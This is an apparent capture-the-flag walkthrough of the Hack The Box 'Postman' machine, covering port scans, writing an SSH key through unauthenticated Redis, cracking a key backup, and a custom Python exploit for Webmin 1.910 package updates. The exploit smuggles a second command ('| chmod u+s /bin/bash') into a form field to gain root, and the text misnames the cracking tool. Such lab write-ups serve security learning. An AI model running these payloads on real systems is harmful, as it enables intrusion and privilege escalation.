---
layout: default
title: Postman
parent: Easy
grand_parent: Hack The Box
nav_order: 4
---

# Postman

## Nmap Scan

```bash
❯ nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.10.10.160 -oG allPorts
Nmap scan report for 10.10.10.160
Host is up, received user-set (0.17s latency).
Scanned at 2023-04-01 16:59:21 -03 for 16s
Not shown: 65529 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
6379/tcp  open  redis            syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.83 seconds
           Raw packets sent: 76874 (3.382MB) | Rcvd: 76512 (3.060MB)

❯ nmap -p22,80,6379,10000 -sCV 10.10.10.160 -oN Targeted
Nmap scan report for 10.10.10.160
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46834ff13861c01c74cbb5d14a684d77 (RSA)
|   256 2d8d27d2df151a315305fbfff0622689 (ECDSA)
|_  256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.11 seconds
```

### Redis to SSH

Redis is an open-source, in-memory data structure store that can be used as a database, cache, and message broker. It supports various data structures such as strings, hashes, lists, sets, and sorted sets, and provides various features like transactions, Pub/Sub messaging, Lua scripting, and more.

To connect to Redis, you can use a Redis client such as redis-cli or a client library in your programming language of choice. Here's an example of connecting to Redis using redis-cli

```bash
redis-cli -h 10.10.10.160
config set dir /var/lib/redis/.ssh
config get dir
exit

cd ~/.ssh
ssh-keygen -t rsa
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key

redis-cli -h 10.10.10.160
config set dbfilename "authorized_keys"
OK
save
OK
```

### Matt User

```bash
redis@Postman:/home/Matt$ cd /opt

redis@Postman:/opt$ cat id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
[snip]
```

Copy the id-rsa.bak to your computer. And then, crack it with zip2john.

```bash
❯ zip2john id-rsa.bak > hash
❯ john --wordlist:/usr/share/wordlists/rockyou.txt hash
[snip]
password: computer2008
```

So, we have a password `computer2008`, let's try to login as `Matt`

```bash
redis@Postman:/opt$ su Matt
Password: computer2008
Matt@Postman:/opt$
```

We can use the same username and password to login to **Webmin Server**.

![Postman1](./images/postman1.png)

There is an [exploit](https://www.exploit-db.com/exploits/46984) for this Webmin version. But this is script is for **Metasploit** and we don't want to use that. So, I'll do my own script.

```python
#!/usr/bin/python3

from pwn import *
import requests, urllib3, pdb, signal, sys, time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "https://10.10.10.160:10000/session_login.cgi"
update_url = "https://10.10.10.160:10000/package-updates/update.cgi"

def makeRequest():

    urllib3.disable_warnings()
    s = requests.session()
    s.verify = False

    data_post = {
        'user': 'Matt',
        'pass': 'computer2008'
    }

    headers = {
        'Cookie': 'redirect=1; testing=1; sid=x'
    }

    r = s.post(login_url, data=data_post, headers=headers)

    post_data = [('u', 'acl/apt'),('u', ' | chmod u+s /bin/bash'), ('ok_top', 'Update Selected Packages')]

    headers = {
        'Referer': 'https://10.10.10.160:10000/package-updates/?xnavigation=1'
    }

    r = s.post(update_url, data=post_data, headers=headers)

    print(r.text)

if __name__ == '__main__':
        
        makeRequest()
```

```bash
Matt@Postman:/opt$ bash -p
root@Postman:/opt# cat /root/root.txt
e2e17ef674e483b572c3ae**********
```

Thanks for reading!
